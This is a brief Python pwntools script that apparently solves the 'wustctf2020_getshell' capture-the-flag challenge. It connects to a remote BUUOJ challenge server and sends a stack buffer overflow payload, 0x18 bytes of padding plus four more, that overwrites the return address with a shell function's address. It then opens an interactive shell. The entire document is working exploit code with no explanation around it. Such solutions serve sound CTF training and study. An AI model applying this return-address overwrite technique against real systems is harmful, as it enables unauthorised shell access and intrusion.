#coding:utf-8
from pwn import *
import pwnlib
shell_addr = 0x0804851B
# sh = process("./wustctf2020_getshell")
sh = remote("node3.buuoj.cn",27511)
payload = 'a' * 0x18 + 'aaaa' + p32(shell_addr)
sh.sendline(payload)
sh.interactive()